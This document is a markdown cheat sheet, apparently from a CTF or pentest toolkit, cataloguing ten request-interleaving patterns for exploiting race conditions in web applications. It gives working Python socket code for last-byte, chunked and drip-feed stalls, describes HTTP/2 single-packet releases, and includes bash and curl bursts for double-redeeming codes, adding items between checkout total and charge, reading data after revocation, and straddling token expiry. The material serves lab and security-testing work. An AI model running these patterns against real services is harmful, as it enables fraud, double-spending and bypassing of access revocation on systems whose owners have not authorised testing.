# Interleave patterns — the request-shapes that win a narrow window

The delivery-side catalogue: every way to hold one request open while another
lands inside its window. For when the burst can't reach the gap.

---

## 1. The last-byte stall (the canonical interleave)

Hold request A's final byte back so the server has parsed and started the
handler — but A's body isn't complete, so it can't commit. Send B complete;
it lands inside A's window. Release A's byte.

```python
import socket, ssl
ctx = ssl.create_default_context()

def prime(host, port, req_head):
    s = ctx.wrap_socket(socket.create_connection((host, port)),
                        server_hostname=host)
    s.sendall(req_head)          # everything except the last body byte
    return s

A = prime(HOST, 443, A_head)     # A's handler is running; last byte withheld
B = ctx.wrap_socket(socket.create_connection((HOST,443)), server_hostname=HOST)
B.sendall(B_full)                # B completes inside A's window
A.sendall(A_last_byte)           # release A — it re-reads and commits
```

The stall point is the *last body byte* — the headers and most of the body are
already parsed, so the handler is in-flight.

## 2. The partial-body stall (chunked)

For a chunked transfer: send all but the last chunk's data, hold the
terminating `0\r\n\r\n`. The server is mid-body-read — its handler can't
commit.

```text
A: POST /profile
   Transfer-Encoding: chunked
   <all chunks except the terminator>   ← withhold 0\r\n\r\n
B: POST /profile  {complete}
A: 0\r\n\r\n                              ← release
```

## 3. The slowloris-window (a drip-feed stall)

Send A's body a byte at a time with delays — the handler waits on the body and
stays in-flight for seconds. Drop B inside the drip.

```python
for byte in A_body[:-1]:
    A.sendall(bytes([byte])); time.sleep(0.05)
B.sendall(B_full)                          # B lands mid-drip
A.sendall(bytes([A_body[-1]]))
```

Use when the handler starts processing headers/partial body before the body
completes — a streaming endpoint.

## 4. The HTTP/2 frame-level stall

On h2 each request is a stream: HEADERS + DATA frames. Withhold each stream's
last DATA frame, then flush all of them in one write — the h2 single-packet.

```text
stream 1: HEADERS + DATA(minus last)   ┐
stream 2: HEADERS + DATA(minus last)   ├─ flush all last DATA frames at once
...                                    ┘   → all commit within microseconds
```

`race_probe`'s barrier does the equivalent at the TCP level.

## 5. The `--url-b` two-request pair

`race_probe`'s interleave form: request A and request B are different.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/profile"  --method POST --body '{"email":"a@x"}' \
  --url-b "$BASE/profile" --method-b POST --body-b '{"email":"b@y"}' \
  --concurrency 2 --count 10 --baseline-count 4 --write-ack --challenge <name>
```

The tool primes both and releases them on a barrier — a coarse interleave. For
a finer one (A held *mid-request*), the manual stall is needed.

## 6. The two-session barrier

Two different actors on a global resource — two cookie jars, one barrier:

```bash
# prime both sessions' requests, release together
python3 tools/web/race_probe.py --url "$BASE/api/redeem" --body '{"code":"XYZ"}' \
  -H 'Cookie: session=A' --concurrency 1 --count 1 --no-barrier &
python3 tools/web/race_probe.py --url "$BASE/api/redeem" --body '{"code":"XYZ"}' \
  -H 'Cookie: session=B' --concurrency 1 --count 1 --no-barrier &
wait
```

Or two `curl`s behind a named-pipe/fifo sync.

## 7. The staged interleave — a flow boundary

Request A is step N of a flow; B is a different step landing mid-flow.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/checkout" --method POST \
  --url-b "$BASE/cart/add" --method-b POST --body-b '{"item":"expensive"}' \
  --concurrency 2 --count 10 --baseline-count 4 --write-ack
```

A's `checkout` computes the total; B's `cart/add` lands between the compute
and the charge.

## 8. The read-vs-write pair — stale-read interleave

`GET` racing `POST` — the read returns the pre-write value inside the write's
commit.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/api/me" --method GET \
  --url-b "$BASE/api/revoke" --method-b POST \
  --concurrency 2 --count 10 --baseline-count 4
```

## 9. The startup race — against an actor's schedule

Not a request-pair — a race against a bot/job's *timing*. Hammer the endpoint
before the actor reaches its step.

```bash
for i in $(seq 1 60); do
  curl -s -o /dev/null -X POST "$BASE/api/register" \
    -d '{"email":"student@domain","password":"yours"}' &
done; wait
```

The "interleave" is *your* register landing before the bot's `registerUser`.

## 10. The boundary-fire — across a deadline

Fire a burst across a deadline/expiry second — some requests' `now` lands
before, some after.

```bash
# a token valid-until-T used at T exactly — the check and the act straddle
for i in $(seq 1 20); do
  curl -s -o /dev/null -X POST "$BASE/api/use" -d "{\"token\":\"$T_TOKEN\"}" -b "$SESSION" &
done; wait
```

## The pattern → use table

| Pattern | For | Tooling |
|---|---|---|
| last-byte stall | narrow window, one request held | raw socket |
| chunked partial-body | a streaming/large-body endpoint | raw socket |
| drip-feed | a handler that reads partial body | raw socket + sleep |
| h2 frame stall | HTTP/2 single-packet | frame-level client |
| `--url-b` pair | two different requests | `race_probe` |
| two-session | global resource, per-account check | two probes + barrier |
| staged | a multi-step flow | `--url-b` step-N + step-M |
| read-vs-write | a stale-read / cached view | `--url-b` GET + POST |
| startup | an actor's timed step | a `for` hammer |
| boundary-fire | a deadline/expiry window | a timed burst |
